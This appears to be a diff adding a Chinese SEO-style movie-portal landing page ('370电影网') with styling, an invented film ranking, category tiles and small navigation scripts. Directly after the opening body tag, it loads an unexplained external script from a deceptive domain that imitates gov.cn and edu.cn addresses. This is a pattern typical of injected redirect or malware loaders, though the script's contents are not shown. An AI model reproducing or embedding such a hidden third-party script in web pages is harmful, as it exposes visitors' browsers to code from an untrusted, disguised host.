@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>370电影网 | 370dianyingwang 在线电影资源库 · 高清影视与观影推荐</title>
+<meta name="keywords" content="370电影网,370dianyingwang,在线电影,高清影视,电影资源,电影推荐,观影导航">
+<meta name="description" content="370电影网（370dianyingwang）是专注于电影资源整理、高清影视分类与观影推荐的在线影视站点，覆盖热门院线、经典高分与多元类型影片，支持手机端自适应访问。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://370dianyingwang-wap.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#080a0f;--panel:#10131c;--card:#151823;--line:#252a38;
+  --txt:#e7eaf2;--sub:#8c97ae;--red:#ff3b5c;--org:#ff8a3d;
+  --yl:#ffcf3d;--r:14px;
+}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",-apple-system,sans-serif;background:var(--bg);color:var(--txt);line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1140px;margin:0 auto;padding:0 18px}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:12px 24px;border-radius:8px;font-size:15px;font-weight:700;border:0;cursor:pointer;transition:.25s}
+.btn-f{background:linear-gradient(135deg,var(--red),var(--org));color:#fff;box-shadow:0 8px 22px rgba(255,59,92,.35)}
+.btn-f:hover{transform:translateY(-3px);box-shadow:0 12px 30px rgba(255,59,92,.5)}
+.btn-o{background:transparent;color:var(--red);border:1.5px solid var(--red)}
+.btn-o:hover{background:rgba(255,59,92,.1)}
+.eyebrow{display:inline-block;font-size:12px;letter-spacing:2px;color:var(--org);background:rgba(255,138,61,.1);padding:4px 12px;border-radius:20px;margin-bottom:12px}
+.sh{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:30px}
+.sh h2{font-size:25px}
+.sh h2 span{color:var(--red)}
+.sh .m{color:var(--sub);font-size:14px}
+.sh .m:hover{color:var(--org)}
+section{padding:58px 0}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r)}
+
+/* 导航 */
+header{position:sticky;top:0;z-index:99;background:rgba(8,10,15,.93);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.bar{display:flex;align-items:center;justify-content:space-between;height:64px;gap:16px}
+.logo{display:flex;align-items:baseline;gap:8px;font-weight:900}
+.logo i{font-style:normal;font-size:24px;background:linear-gradient(135deg,var(--red),var(--yl));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo em{font-style:normal;font-size:15px;color:var(--sub)}
+.nav{display:flex;align-items:center;gap:4px}
+.nav a{padding:8px 14px;font-size:14.5px;color:var(--sub);border-radius:6px;transition:.2s}
+.nav a:hover{color:var(--txt);background:var(--panel)}
+.nav a.on{color:var(--red);background:rgba(255,59,92,.1)}
+.mb{display:none;background:none;border:0;color:var(--org);font-size:26px;cursor:pointer}
+
+/* Hero - 不对称倾斜布局 */
+.hero{position:relative;padding:78px 0 64px;border-bottom:1px solid var(--line);overflow:hidden}
+.hero::before{content:"";position:absolute;inset:-20% -10% auto auto;width:520px;height:520px;background:radial-gradient(circle,rgba(255,59,92,.18),transparent 65%);transform:rotate(-12deg)}
+.hero::after{content:"";position:absolute;inset:auto auto -30% -8%;width:420px;height:420px;background:radial-gradient(circle,rgba(255,138,61,.14),transparent 65%)}
+.hrow{display:grid;grid-template-columns:1.05fr .95fr;gap:54px;align-items:center;position:relative}
+.hero h1{font-size:clamp(30px,5.6vw,50px);line-height:1.2;font-weight:900;margin-bottom:8px}
+.hero h1 u{text-decoration:none;color:var(--org)}
+.hero .lead{color:var(--sub);font-size:16.5px;max-width:500px;margin:16px 0 28px}
+.hero .btns{display:flex;gap:12px;flex-wrap:wrap}
+.bigposter{position:relative;border-radius:18px;overflow:hidden;transform:skewY(-4deg);box-shadow:0 24px 60px rgba(0,0,0,.6);border:1px solid var(--line)}
+.bigposter svg{display:block;width:100%;height:auto}
+.bigposter .cap{position:absolute;left:18px;bottom:18px;right:18px;transform:skewY(4deg)}
+.bigposter .cap b{display:block;font-size:20px;margin-bottom:4px}
+.bigposter .cap small{color:#ffd9a0}
+.tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:30px}
+.tags span{font-size:13px;color:var(--sub);border:1px solid var(--line);padding:5px 12px;border-radius:20px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;margin-top:44px;background:var(--line);border:1px solid var(--line);border-radius:10px}
+.stats div{background:var(--panel);padding:18px 8px;text-align:center}
+.stats b{display:block;font-size:24px;background:linear-gradient(135deg,var(--red),var(--yl));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stats small{color:var(--sub);font-size:12.5px}
+
+/* 热门榜 - 排行数字砖块 */
+.rank{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.rk{display:flex;gap:16px;align-items:center;padding:14px;border-radius:var(--r);background:var(--card);border:1px solid var(--line);transition:.25s}
+.rk:hover{border-color:var(--red);transform:translateX(4px)}
+.rk .no{font-size:30px;font-weight:900;line-height:1;min-width:48px;text-align:center;color:var(--line)}
+.rk:nth-child(1) .no{color:var(--yl)}.rk:nth-child(2) .no{color:var(--org)}.rk:nth-child(3) .no{color:var(--red)}
+.rk .info{flex:1;min-width:0}
+.rk h3{font-size:16px;margin-bottom:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rk p{color:var(--sub);font-size:13px}
+.rk .sc{font-weight:800;font-size:18px;color:var(--yl);white-space:nowrap}
+
+/* 分类 - 网格磁贴 */
+.cat{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px}
+.tile{position:relative;padding:22px;border-radius:var(--r);overflow:hidden;border:1px solid var(--line);background:var(--card);transition:.3s}
+.tile::before{content:"";position:absolute;right:-30px;top:-30px;width:120px;height:120px;border-radius:50%;background:var(--c,var(--red));opacity:.14;transition:.3s}
+.tile:hover{transform:translateY(-6px);border-color:var(--c,var(--red))}
+.tile:hover::before{opacity:.28;transform:scale(1.3)}
+.tile .ic{font-size:30px;margin-bottom:10px;display:block}
+.tile h3{font-size:16.5px;margin-bottom:5px}
+.tile p{color:var(--sub);font-size:13px;margin-bottom:14px}
+.tile .go{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:var(--sub)}
+.tile:hover .go{color:var(--c,var(--red))}
+
+/* 关于 - 双卡对比式 */
+.abt{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.infobox{padding:28px;border-radius:var(--r);background:var(--card);border:1px solid var(--line)}
+.infobox h3{font-size:18px;margin-bottom:14px;color:var(--org)}
+.infobox ul{list-style:none;display:flex;flex-direction:column;gap:12px}
+.infobox li{display:flex;gap:12px;font-size:14.5px;color:var(--sub)}
+.infobox li b{color:var(--txt);min-width:76px}
+.urlbox{padding:28px;border-radius:var(--r);background:linear-gradient(160deg,var(--panel),var(--card));border:1px dashed var(--org)}
+.urlbox h3{font-size:18px;margin-bottom:8px}
+.urlbox p{color:var(--sub);font-size:14px;margin-bottom:18px}
+.chain{display:flex;gap:10px}
+.chain input{flex:1;background:var(--bg);border:1px solid var(--line);color:var(--yl);padding:12px 14px;border-radius:8px;font-size:14px;font-family:Consolas,monospace}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);background:var(--panel);padding:46px 0 26px;margin-top:24px}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:32px}
+.ft .brand i{font-style:normal;font-size:22px;font-weight:900;background:linear-gradient(135deg,var(--red),var(--yl));-webkit-background-clip:text;background-clip:text;color:transparent}
+.ft .brand p{color:var(--sub);font-size:14px;margin-top:10px}
+.ft h4{font-size:13px;color:var(--org);letter-spacing:1px;margin-bottom:14px}
+.ft ul{list-style:none;display:flex;flex-direction:column;gap:10px}
+.ft a{color:var(--sub);font-size:14px}
+.ft a:hover{color:var(--red)}
+.copy{margin-top:34px;padding-top:20px;border-top:1px solid var(--line);color:var(--sub);font-size:13px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+
+@media(max-width:920px){.hrow{grid-template-columns:1fr;gap:40px}.abt{grid-template-columns:1fr}.ft{grid-template-columns:1fr 1fr}}
+@media(max-width:760px){
+  .nav{position:fixed;top:64px;left:0;right:0;flex-direction:column;background:var(--panel);padding:16px;border-bottom:1px solid var(--line);transform:translateY(-170%);transition:.3s}
+  .nav.open{transform:translateY(0)}
+  .nav a{width:100%;text-align:center;padding:13px}
+  .mb{display:block}
+  .hero{padding:50px 0 42px}section{padding:44px 0}
+  .rank{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr 1fr}
+  .bigposter{transform:skewY(-2deg)}.bigposter .cap{transform:skewY(2deg)}
+  .sh h2{font-size:21px}
+}
+@media(max-width:420px){.chain{flex-direction:column}.hero h1{font-size:29px}.ft{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap bar">
+    <a class="logo" href="#home"><i>370</i><em>电影网</em></a>
+    <nav class="nav" id="nav">
+      <a href="#home" class="on">首页</a>
+      <a href="#top">热门榜单</a>
+      <a href="#cat">分类频道</a>
+      <a href="#about">关于本站</a>
+      <a href="#" class="btn btn-o" style="margin-left:6px;padding:8px 18px">会员中心</a>
+    </nav>
+    <button class="mb" id="mb" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- 首页 -->
+<section id="home" class="hero">
+  <div class="wrap hrow">
+    <div>
+      <span class="eyebrow">◆ 370DIANYINGWANG · 在线影视</span>
+      <h1>每天一部好电影<br>从 <u>370电影网</u> 开始</h1>
+      <p class="lead">聚焦热门院线、高分经典与多元类型影片，提供清晰的分类目录与观影推荐，让找电影这件事变得简单。</p>
+      <div class="btns">
+        <a class="btn btn-f" href="#top">查看热门榜单 →</a>
+        <a class="btn btn-o" href="#cat">浏览分类频道</a>
+      </div>
+      <div class="tags">
+        <span># 高清影视</span><span># 热门院线</span><span># 经典高分</span><span># 多元类型</span><span># 每日更新</span>
+      </div>
+      <div class="stats">
+        <div><b>2200+</b><small>收录影片</small></div>
+        <div><b>14</b><small>分类频道</small></div>
+        <div><b>4K</b><small>画质支持</small></div>
+        <div><b>24h</b><small>实时更新</small></div>
+      </div>
+    </div>
+    <div class="bigposter">
+      <svg viewBox="0 0 460 560" xmlns="http://www.w3.org/2000/svg">
+        <defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#3a0d18"/><stop offset="1" stop-color="#1a0a08"/></linearGradient></defs>
+        <rect width="460" height="560" fill="url(#g1)"/>
+        <circle cx="340" cy="150" r="130" fill="#ff3b5c" opacity=".28"/>
+        <circle cx="120" cy="420" r="100" fill="#ff8a3d" opacity=".22"/>
+        <path d="M0 400 Q230 300 460 420 V560 H0 Z" fill="#ff8a3d" opacity=".14"/>
+        <polygon points="210,250 215,300 268,302 225,335 240,388 210,360 180,388 195,335 152,302 205,300" fill="#ffcf3d" opacity=".95"/>
+        <text x="40" y="490" fill="#ffd9a0" font-size="34" font-weight="900" font-family="sans-serif">370 电影网</text>
+      </svg>
+      <div class="cap"><b>今日推荐 · 精选片单</b><small>院线热片实时同步，经典佳作持续收录</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- 热门榜单（数字砖块结构） -->
+<section id="top">
+  <div class="wrap">
+    <div class="sh">
+      <div><span class="eyebrow">◆ TOP CHART</span><h2><span>热门</span> 观影榜单</h2></div>
+      <a class="m" href="#">完整榜单 →</a>
+    </div>
+    <div class="rank">
+
+      <a class="rk" href="#"><span class="no">01</span><div class="info"><h3>逆光之城</h3><p>2025 · 悬疑 / 犯罪 · 138分钟</p></div><span class="sc">9.3</span></a>
+      <a class="rk" href="#"><span class="no">02</span><div class="info"><h3>云端迷局</h3><p>2025 · 科幻 / 动作 · 126分钟</p></div><span class="sc">9.0</span></a>
+      <a class="rk" href="#"><span class="no">03</span><div class="info"><h3>归途列车</h3><p>2024 · 剧情 / 家庭 · 119分钟</p></div><span class="sc">8.9</span></a>
+      <a class="rk" href="#"><span class="no">04</span><div class="info"><h3>极夜追击</h3><p>2025 · 动作 / 惊悚 · 112分钟</p></div><span class="sc">8.7</span></a>
+      <a class="rk" href="#"><span class="no">05</span><div class="info"><h3>潮汐之下</h3><p>2024 · 纪录 / 自然 · 96分钟</p></div><span class="sc">8.8</span></a>
+      <a class="rk" href="#"><span class="no">06</span><div class="info"><h3>糖霜小镇</h3><p>2024 · 喜剧 / 动画 · 104分钟</p></div><span class="sc">8.4</span></a>
+      <a class="rk" href="#"><span class="no">07</span><div class="info"><h3>双面契约</h3><p>2025 · 悬疑 / 剧情 · 131分钟</p></div><span class="sc">8.6</span></a>
+      <a class="rk" href="#"><span class="no">08</span><div class="info"><h3>风之彼岸</h3><p>2024 · 奇幻 / 冒险 · 145分钟</p></div><span class="sc">8.5</span></a>
+
+    </div>
+  </div>
+</section>
+
+<!-- 分类频道（磁贴网格结构） -->
+<section id="cat" style="background:var(--panel)">
+  <div class="wrap">
+    <div class="sh">
+      <div><span class="eyebrow">◆ CATEGORY</span><h2>分类 <span>频道</span></h2></div>
+      <a class="m" href="#">全部分类 →</a>
+    </div>
+    <div class="cat">
+
+      <a class="tile" href="#" style="--c:#ff3b5c"><span class="ic">💥</span><h3>动作冒险</h3><p>高能场面，节奏紧凑，肾上腺素拉满</p><div class="go"><span>302 部</span><span>进入 →</span></div></a>
+      <a class="tile" href="#" style="--c:#ff8a3d"><span class="ic">❤️</span><h3>爱情剧情</h3><p>细腻情感，打动人心的真实故事</p><div class="go"><span>268 部</span><span>进入 →</span></div></a>
+      <a class="tile" href="#" style="--c:#ffcf3d"><span class="ic">🕵️</span><h3>悬疑惊悚</h3><p>反转不断，烧脑推理停不下来</p><div class="go"><span>214 部</span><span>进入 →</span></div></a>
+      <a class="tile" href="#" style="--c:#3b6dff"><span class="ic">🚀</span><h3>科幻奇幻</h3><p>脑洞世界观与视觉奇观</p><div class="go"><span>256 部</span><span>进入 →</span></div></a>
+      <a class="tile" href="#" style="--c:#22e39a"><span class="ic">😂</span><h3>喜剧动画</h3><p>轻松解压，全家皆宜</p><div class="go"><span>328 部</span><span>进入 →</span></div></a>
+      <a class="tile" href="#" style="--c:#9b5cff"><span class="ic">🎬</span><h3>经典高分</h3><p>影史佳作，口碑常青</p><div class="go"><span>245 部</span><span>进入 →</span></div></a>
+      <a class="tile" href="#" style="--c:#00e5ff"><span class="ic">📺</span><h3>院线热映</h3><p>近期上映，实时同步</p><div class="go"><span>126 部</span><span>进入 →</span></div></a>
+      <a class="tile" href="#" style="--c:#ff5b5b"><span class="ic">🌍</span><h3>海外佳片</h3><p>多语种高分影片精选</p><div class="go"><span>189 部</span><span>进入 →</span></div></a>
+
+    </div>
+  </div>
+</section>
+
+<!-- 关于本站（双卡结构） -->
+<section id="about">
+  <div class="wrap">
+    <div class="sh">
+      <div><span class="eyebrow">◆ ABOUT</span><h2>关于 <span>370电影网</span></h2></div>
+    </div>
+    <div class="abt">
+      <div class="infobox">
+        <h3>站点特色</h3>
+        <ul>
+          <li><b>精选片单</b><span>人工筛选与整理，品质优先，减少无效翻找。</span></li>
+          <li><b>多维分类</b><span>按类型、年份、评分多维度划分，检索更精准。</span></li>
+          <li><b>实时更新</b><span>院线热片与高分佳作持续收录与同步。</span></li>
+          <li><b>轻量访问</b><span>单页结构加载迅速，导航与内容一目了然。</span></li>
+          <li><b>移动友好</b><span>自适应布局，手机、平板、桌面均流畅。</span></li>
+        </ul>
+      </div>
+      <div>
+        <div class="urlbox">
+          <h3>官方网站地址</h3>
+          <p>欢迎收藏 370电影网，也可把网址分享给同样爱看电影的朋友。</p>
+          <div class="chain">
+            <input type="text" value="https://370dianyingwang-wap.github.io" readonly id="u">
+            <button class="btn btn-f" id="cp" type="button">复制</button>
+          </div>
+        </div>
+        <p style="color:var(--sub);font-size:14.5px;margin-top:18px">370电影网（370dianyingwang）是一个专注于电影资源整理、影片分类与观影推荐的在线影视导航站，致力于帮助用户更快发现值得一看的好电影。</p>
+        <div class="btns" style="margin-top:20px">
+          <a class="btn btn-f" href="#">提交影片建议</a>
+          <a class="btn btn-o" href="#cat">浏览分类频道</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="brand"><i>370电影网</i><p>每天一部好电影，从 370电影网开始。专注电影资源整理与分类导航。</p></div>
+      <div><h4>站点栏目</h4><ul><li><a href="#home">首页</a></li><li><a href="#top">热门榜单</a></li><li><a href="#cat">分类频道</a></li><li><a href="#about">关于本站</a></li></ul></div>
+      <div><h4>影片分类</h4><ul><li><a href="#">动作冒险</a></li><li><a href="#">悬疑惊悚</a></li><li><a href="#">科幻奇幻</a></li><li><a href="#">喜剧动画</a></li></ul></div>
+      <div><h4>联系反馈</h4><ul><li><a href="#">提交建议</a></li><li><a href="#">合作洽谈</a></li><li><a href="#">友情链接</a></li><li><a href="#">问题反馈</a></li></ul></div>
+    </div>
+    <div class="copy"><span>© 2026 370电影网 370dianyingwang. 保留所有权利.</span><span>网址：https://370dianyingwang-wap.github.io</span></div>
+  </div>
+</footer>
+
+<script>
+var mb=document.getElementById('mb'),nav=document.getElementById('nav');
+mb.addEventListener('click',function(){nav.classList.toggle('open')});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open')});
+var links=document.querySelectorAll('.nav a'),secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){if(window.scrollY>=s.offsetTop-130)cur=s.id});
+  links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur)});
+});
+var cp=document.getElementById('cp'),u=document.getElementById('u');
+cp.addEventListener('click',function(){
+  u.select();
+  try{document.execCommand('copy');cp.textContent='已复制'}catch(e){cp.textContent='请手动复制'}
+  setTimeout(function(){cp.textContent='复制'},1600);
+});
+</script>
+</body>
+</html>
